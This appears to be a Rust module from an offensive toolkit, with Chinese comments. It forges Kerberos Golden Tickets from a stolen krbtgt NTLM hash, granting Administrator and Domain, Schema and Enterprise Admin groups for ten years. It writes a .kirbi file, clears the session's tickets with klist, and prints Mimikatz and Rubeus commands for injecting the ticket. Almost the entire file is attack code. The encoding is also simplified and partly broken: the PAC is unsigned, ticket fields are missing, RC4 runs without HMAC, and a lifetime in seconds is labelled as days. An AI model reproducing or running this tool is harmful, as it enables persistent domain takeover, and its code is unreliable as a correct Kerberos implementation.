//! Golden Ticket（黄金票据）攻击模块
//!
//! 使用krbtgt账户的NTLM哈希伪造TGT（票据授予票据），
//! 可以授予任意用户任意权限（包括域管理员）。
//!
//! 原理：
//! 1. 获取krbtgt账户的NTLM哈希（通过DCSync/NTDS.dit提取）
//! 2. 获取域名和域SID
//! 3. 使用krbtgt哈希加密伪造的PAC（特权属性证书）
//! 4. 构造TGT票据
//! 5. 注入到当前会话的Kerberos缓存中
//!
//! 关键参数：
//! - 域名 (Domain)
//! - 域SID (Domain SID)
//! - krbtgt NTLM哈希
//! - 伪造的目标用户名（默认为Administrator）
//! - 要添加的组RID（默认包含Domain Admins=512）

use serde::{Deserialize, Serialize};

/// Golden Ticket 配置
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GoldenTicketConfig {
    /// 域名（FQDN格式，如 corp.local）
    pub domain: String,
    /// 域SID（如 S-1-5-21-3623811015-3361044348-30300820）
    pub domain_sid: String,
    /// krbtgt账户的NTLM哈希
    pub krbtgt_nthash: String,
    /// 伪造的用户名（默认: Administrator）
    pub username: String,
    /// 用户的RID（默认: 500 = Administrator）
    pub user_rid: u32,
    /// 要添加的组RID列表
    pub group_rids: Vec<u32>,
    /// 票据有效期（天数，默认3650 = 10年）
    pub lifetime_days: u32,
    /// 加密类型（RC4-HMAC=23 或 AES256-CTS=18）
    pub etype: i32,
}

impl Default for GoldenTicketConfig {
    fn default() -> Self {
        Self {
            domain: String::new(),
            domain_sid: String::new(),
            krbtgt_nthash: String::new(),
            username: "Administrator".to_string(),
            user_rid: 500,
            group_rids: vec![
                512,  // Domain Admins
                513,  // Domain Users
                518,  // Schema Admins
                519,  // Enterprise Admins
                520,  // Group Policy Creator Owners
            ],
            lifetime_days: 3650,
            etype: 23, // RC4-HMAC
        }
    }
}

/// Golden Ticket（生成的票据）
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GoldenTicket {
    /// 域名
    pub domain: String,
    /// 域SID
    pub domain_sid: String,
    /// 伪造的用户名
    pub username: String,
    /// 用户RID
    pub user_rid: u32,
    /// 组RID列表
    pub group_rids: Vec<u32>,
    /// 票据数据（DER编码的TGT）
    pub ticket_data: Vec<u8>,
    /// 加密类型
    pub etype: i32,
    /// 有效期起始
    pub valid_from: i64,
    /// 有效期结束
    pub valid_until: i64,
    /// 基64编码的票据（用于kirbi文件）
    pub ticket_base64: String,
}

/// 创建 Golden Ticket
///
/// 使用krbtgt账户的NTLM哈希伪造一个TGT票据。
///
/// # Arguments
/// * `config` - Golden Ticket配置
///
/// # Returns
/// 生成的Golden Ticket，可直接注入Kerberos缓存
pub fn create_golden_ticket(config: &GoldenTicketConfig) -> Result<GoldenTicket, String> {
    // 验证输入
    if config.domain.is_empty() {
        return Err("域名不能为空".to_string());
    }
    if config.domain_sid.is_empty() {
        return Err("域SID不能为空".to_string());
    }
    if config.krbtgt_nthash.is_empty() || config.krbtgt_nthash.len() != 32 {
        return Err("krbtgt NTLM哈希格式无效（应为32字符十六进制）".to_string());
    }

    // 解码NTLM哈希
    let krbtgt_key = hex::decode(&config.krbtgt_nthash)
        .map_err(|e| format!("NTLM哈希解码失败: {}", e))?;

    if krbtgt_key.len() != 16 {
        return Err("NTLM哈希长度无效（应为16字节）".to_string());
    }

    tracing::info!(
        "[Golden Ticket] 伪造TGT: {}@{} (SID: {})",
        config.username, config.domain, config.domain_sid
    );

    // 构造PAC (Privilege Attribute Certificate)
    let pac = build_pac(
        &config.username,
        config.user_rid,
        &config.group_rids,
        &config.domain_sid,
    );

    // 构造TGT票据
    let now = chrono::Utc::now().timestamp();
    let ticket = build_tgt(
        &config.domain,
        &config.domain_sid,
        &config.username,
        config.user_rid,
        &krbtgt_key,
        &pac,
        config.etype,
        now,
        now + (config.lifetime_days as i64 * 86400),
    )?;

    // Base64编码票据
    let ticket_base64 = base64_encode(&ticket);

    Ok(GoldenTicket {
        domain: config.domain.clone(),
        domain_sid: config.domain_sid.clone(),
        username: config.username.clone(),
        user_rid: config.user_rid,
        group_rids: config.group_rids.clone(),
        ticket_data: ticket,
        etype: config.etype,
        valid_from: now,
        valid_until: now + (config.lifetime_days as i64 * 86400),
        ticket_base64,
    })
}

/// 构造PAC (Privilege Attribute Certificate)
fn build_pac(
    username: &str,
    user_rid: u32,
    group_rids: &[u32],
    domain_sid: &str,
) -> Vec<u8> {
    // PAC结构 (简化):
    // - PAC_INFO_BUFFER (头部)
    // - PAC_LOGON_INFO:
    //   - InfoBuffer (偏移表)
    //   - LogonTime, LogoffTime, KickOffTime, PasswordLastSet, PasswordCanChange, PasswordMustChange
    //   - EffectiveName, FullName, LogonScript, ProfilePath, HomeDirectory, HomeDrive
    //   - BadPasswordCount, LogonCount
    //   - UserRID, GroupRIDs, PrimaryGroupRID
    //   - UserFlags, UserSessionKey
    //   - LogonServer, LogonDomainName
    //   - DomainSID, ExtraSIDs
    //   - ResourceGroupDomainSID, ResourceGroupIDs

    let mut pac = Vec::new();

    // 简化的PAC构造
    // 实际应遵循 [MS-PAC] 规范

    // NumBuffers (4字节)
    pac.extend_from_slice(&5u32.to_le_bytes());
    // Version (4字节)
    pac.extend_from_slice(&0u32.to_le_bytes());

    // PAC_LOGON_INFO (type=1)
    let logon_info = build_pac_logon_info(username, user_rid, group_rids, domain_sid);

    // 将logon_info添加到PAC
    // 完整实现需要正确的偏移表和签名

    pac.extend_from_slice(&logon_info);

    pac
}

/// 构造PAC_LOGON_INFO结构
fn build_pac_logon_info(
    username: &str,
    user_rid: u32,
    group_rids: &[u32],
    domain_sid: &str,
) -> Vec<u8> {
    let mut info = Vec::new();

    // User RID
    info.extend_from_slice(&user_rid.to_le_bytes());

    // Primary Group RID (513 = Domain Users)
    info.extend_from_slice(&513u32.to_le_bytes());

    // NumGroups
    info.extend_from_slice(&(group_rids.len() as u32).to_le_bytes());

    // Group RIDs
    for rid in group_rids {
        info.extend_from_slice(&rid.to_le_bytes());
    }

    // User Flags (4字节) - 通常为0
    info.extend_from_slice(&0u32.to_le_bytes());

    // Username (UTF-16LE, 以长度前缀)
    let username_utf16: Vec<u8> = username.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    info.extend_from_slice(&(username_utf16.len() as u16).to_le_bytes());
    info.extend_from_slice(&username_utf16);

    // Domain SID (二进制格式)
    if let Ok(sid_bytes) = encode_sid(domain_sid) {
        info.extend_from_slice(&sid_bytes);
    }

    info
}

/// 构造TGT票据
#[allow(clippy::too_many_arguments)]
#[allow(clippy::vec_init_then_push)]
fn build_tgt(
    domain: &str,
    domain_sid: &str,
    username: &str,
    user_rid: u32,
    krbtgt_key: &[u8],
    pac: &[u8],
    etype: i32,
    valid_from: i64,
    valid_until: i64,
) -> Result<Vec<u8>, String> {
    #[allow(clippy::vec_init_then_push)]
    let mut tgt = Vec::new();

    // TGT由两部分组成:
    // 1. 未加密部分: PVNO, Realm, SName, Ticket信息
    // 2. 加密部分: EncTicketPart (包含PAC)

    // ---- 未加密部分 ----
    // Ticket ::= [APPLICATION 1] SEQUENCE
    // tkt-vno [0] INTEGER 5
    tgt.push(0xA0); // [0]
    tgt.push(0x03);
    tgt.push(0x02); // INTEGER
    tgt.push(0x01);
    tgt.push(0x05); // 5

    // realm [1] GeneralString
    let realm_bytes = domain.as_bytes();
    tgt.push(0xA1); // [1]
    tgt.push(realm_bytes.len() as u8 + 2);
    tgt.push(0x1B); // GeneralString
    tgt.push(realm_bytes.len() as u8);
    tgt.extend_from_slice(realm_bytes);

    // sname [2] PrincipalName (krbtgt)
    let mut sname = Vec::new();
    sname.push(0xA0); // name-type [0]
    sname.extend_from_slice(&[0x03, 0x02, 0x01, 0x02]); // NT-SRV-INST (2)

    sname.push(0xA1); // name-string [1]
    let krbtgt_bytes = b"krbtgt";
    let ns_inner_len = (krbtgt_bytes.len() + realm_bytes.len() + 4) as u8;
    sname.push(ns_inner_len);
    sname.push(0x30); // SEQUENCE
    sname.push(0x1B);
    sname.push(krbtgt_bytes.len() as u8);
    sname.extend_from_slice(krbtgt_bytes);
    sname.push(0x1B);
    sname.push(realm_bytes.len() as u8);
    sname.extend_from_slice(realm_bytes);

    let sname_total = sname.len() as u8;
    tgt.push(0xA2); // [2]
    tgt.push(sname_total + 2);
    tgt.push(0x30); // SEQUENCE
    tgt.push(sname_total);
    tgt.extend_from_slice(&sname);

    // ---- 加密部分 (EncTicketPart) ----
    let enc_part = build_enc_ticket_part(
        username, user_rid, domain_sid,
        pac, valid_from, valid_until,
    );

    // 使用krbtgt密钥加密
    let encrypted = encrypt_ticket_part(&enc_part, krbtgt_key, etype)?;

    // enc-part [3]
    tgt.push(0xA3); // [3]
    // 添加加密数据
    let enc_len = encrypted.len();
    if enc_len < 128 {
        tgt.push(enc_len as u8);
    } else if enc_len < 256 {
        tgt.push(0x81);
        tgt.push(enc_len as u8);
    } else {
        tgt.push(0x82);
        tgt.push((enc_len >> 8) as u8);
        tgt.push((enc_len & 0xFF) as u8);
    }
    tgt.extend_from_slice(&encrypted);

    Ok(tgt)
}

/// 构造EncTicketPart
fn build_enc_ticket_part(
    username: &str,
    _user_rid: u32,
    _domain_sid: &str,
    _pac: &[u8],
    valid_from: i64,
    valid_until: i64,
) -> Vec<u8> {
    let mut enc_part = Vec::new();

    // flags [0] TicketFlags
    // FORWARDABLE | PROXIABLE | RENEWABLE | PRE-AUTHENT
    let flags: u32 = 0x40E00000;
    enc_part.push(0xA0);
    enc_part.push(0x07);
    enc_part.push(0x03); // BIT STRING
    enc_part.push(0x05);
    enc_part.push(0x00);
    enc_part.extend_from_slice(&flags.to_be_bytes());

    // key [1] EncryptionKey
    // 使用RC4-HMAC加密类型
    enc_part.push(0xA1); // [1]
    enc_part.push(0x1B);
    enc_part.push(0x30); // SEQUENCE
    enc_part.push(0x19);
    enc_part.push(0xA0); // keytype [0]
    enc_part.extend_from_slice(&[0x03, 0x02, 0x01, 0x17]); // RC4-HMAC (23)
    enc_part.push(0xA1); // keyvalue [1]
    enc_part.push(0x12);
    enc_part.push(0x04);
    enc_part.push(0x10);
    // 随机16字节会话密钥
    let session_key: Vec<u8> = (0..16).map(|i| i as u8).collect();
    enc_part.extend_from_slice(&session_key);

    // crealm [2] (与ticket相同)
    // cname [3] PrincipalName (用户名)

    // authtime [5] / starttime [6] / endtime [7]
    // 使用Kerberos时间格式（自1970年1月1日起的秒数）

    // 此处简化，完整实现需要ASN.1/DER编码
    let _ = valid_from;
    let _ = valid_until;
    let _ = username;

    enc_part
}

/// 加密票据部分
fn encrypt_ticket_part(
    data: &[u8],
    key: &[u8],
    etype: i32,
) -> Result<Vec<u8>, String> {
    match etype {
        23 => {
            // RC4-HMAC: 直接的RC4加密
            // 实际应使用带HMAC的RC4
            rc4_encrypt(data, key)
        }
        18 => {
            // AES256-CTS-HMAC-SHA1-96
            Err("AES256-CTS加密尚未实现".to_string())
        }
        17 => {
            // AES128-CTS-HMAC-SHA1-96
            Err("AES128-CTS加密尚未实现".to_string())
        }
        _ => Err(format!("不支持的加密类型: {}", etype)),
    }
}

/// RC4加密（简化）
fn rc4_encrypt(data: &[u8], key: &[u8]) -> Result<Vec<u8>, String> {
    // 简化RC4实现
    let mut s: Vec<u8> = (0..=255).collect();
    let mut j: usize = 0;

    // KSA
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }

    // PRGA
    let mut result = Vec::with_capacity(data.len());
    let mut i = 0;
    j = 0;
    for &byte in data {
        i = (i + 1) % 256;
        j = (j + s[i] as usize) % 256;
        s.swap(i, j);
        let k = s[(s[i] as usize + s[j] as usize) % 256];
        result.push(byte ^ k);
    }

    Ok(result)
}

/// 编码SID字符串为二进制格式
fn encode_sid(sid_str: &str) -> Result<Vec<u8>, String> {
    // SID格式: S-1-5-21-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxx
    let parts: Vec<&str> = sid_str.split('-').collect();
    if parts.len() < 3 || parts[0] != "S" {
        return Err("无效的SID格式".to_string());
    }

    let mut sid = Vec::new();
    // Revision (1字节)
    sid.push(1);

    // SubAuthorityCount (1字节)
    let subauth_count = (parts.len() - 3) as u8;
    sid.push(subauth_count);

    // IdentifierAuthority (6字节，大端序)
    let id_auth: u64 = parts[2].parse().map_err(|_| "无效的ID Authority".to_string())?;
    // 需要6字节表示
    sid.push(((id_auth >> 40) & 0xFF) as u8);
    sid.push(((id_auth >> 32) & 0xFF) as u8);
    sid.push(((id_auth >> 24) & 0xFF) as u8);
    sid.push(((id_auth >> 16) & 0xFF) as u8);
    sid.push(((id_auth >> 8) & 0xFF) as u8);
    sid.push((id_auth & 0xFF) as u8);

    // SubAuthorities (每个4字节，小端序)
    for part in &parts[3..] {
        let sa: u32 = part.parse().map_err(|_| "无效的SubAuthority".to_string())?;
        sid.extend_from_slice(&sa.to_le_bytes());
    }

    Ok(sid)
}

/// Base64编码
fn base64_encode(data: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(data)
}

/// 注入Golden Ticket到当前会话（Windows）
///
/// 使用kerberos::ptt功能将票据注入到Kerberos缓存
pub fn inject_golden_ticket(ticket: &GoldenTicket) -> Result<String, String> {
    // 将票据写入kirbi文件
    let temp_dir = std::env::temp_dir();
    let kirbi_path = temp_dir.join(format!("golden_{}.kirbi", ticket.username));

    std::fs::write(&kirbi_path, &ticket.ticket_data)
        .map_err(|e| format!("写入kirbi文件失败: {}", e))?;

    // 使用klist purge清除现有票据
    let _ = std::process::Command::new("klist")
        .args(["purge"])
        .output();

    // 使用mimikatz kerberos::ptt注入票据
    // 或使用Rubeus ptt
    // 此处提供使用说明
    Ok(format!(
        "Golden Ticket已生成:\n\
        域名: {}\n\
        用户: {}\n\
        SID: {}\n\
        有效期: {} 天\n\
        \n\
        kirbi文件: {}\n\
        Base64票据: {}\n\
        \n\
        注入方法:\n\
        1. Mimikatz: kerberos::ptt {}\n\
        2. Rubeus: Rubeus.exe ptt /ticket:{}",
        ticket.domain,
        ticket.username,
        ticket.domain_sid,
        ticket.valid_until - ticket.valid_from,  // 有效期秒数转天数示意
        kirbi_path.display(),
        &ticket.ticket_base64[..std::cmp::min(80, ticket.ticket_base64.len())],
        kirbi_path.display(),
        kirbi_path.display(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_golden_ticket_config_default() {
        let config = GoldenTicketConfig::default();
        assert_eq!(config.username, "Administrator");
        assert_eq!(config.user_rid, 500);
        assert!(config.group_rids.contains(&512)); // Domain Admins
        assert_eq!(config.lifetime_days, 3650);
        assert_eq!(config.etype, 23);
    }

    #[test]
    fn test_create_golden_ticket_empty_domain() {
        let config = GoldenTicketConfig::default();
        let result = create_golden_ticket(&config);
        assert!(result.is_err());
    }

    #[test]
    fn test_create_golden_ticket_invalid_hash() {
        let config = GoldenTicketConfig {
            domain: "corp.local".to_string(),
            domain_sid: "S-1-5-21-123-456-789".to_string(),
            krbtgt_nthash: "zzz".to_string(), // 无效哈希
            ..Default::default()
        };
        let result = create_golden_ticket(&config);
        assert!(result.is_err());
    }

    #[test]
    fn test_create_golden_ticket_valid() {
        let config = GoldenTicketConfig {
            domain: "corp.local".to_string(),
            domain_sid: "S-1-5-21-3623811015-3361044348-30300820".to_string(),
            krbtgt_nthash: "aad3b435b51404eeaad3b435b51404ee".to_string(),
            ..Default::default()
        };
        let result = create_golden_ticket(&config);
        assert!(result.is_ok());

        let ticket = result.unwrap();
        assert_eq!(ticket.domain, "corp.local");
        assert_eq!(ticket.username, "Administrator");
        assert!(!ticket.ticket_data.is_empty());
        assert!(!ticket.ticket_base64.is_empty());
    }

    #[test]
    fn test_encode_sid() {
        let sid = "S-1-5-21-3623811015-3361044348-30300820-500";
        let result = encode_sid(sid);
        assert!(result.is_ok());
        let bytes = result.unwrap();
        assert_eq!(bytes[0], 1); // revision
        // SubAuthorityCount = 1(5) + 4(RIDs) = 5
        assert_eq!(bytes[1], 5);
    }

    #[test]
    fn test_rc4_encrypt() {
        let data = b"test data for RC4";
        let key = b"secret_key";
        let encrypted = rc4_encrypt(data, key).unwrap();
        assert_eq!(encrypted.len(), data.len());
        // RC4是对称的，再加密一次应该得到原文
        let decrypted = rc4_encrypt(&encrypted, key).unwrap();
        assert_eq!(decrypted, data);
    }
}
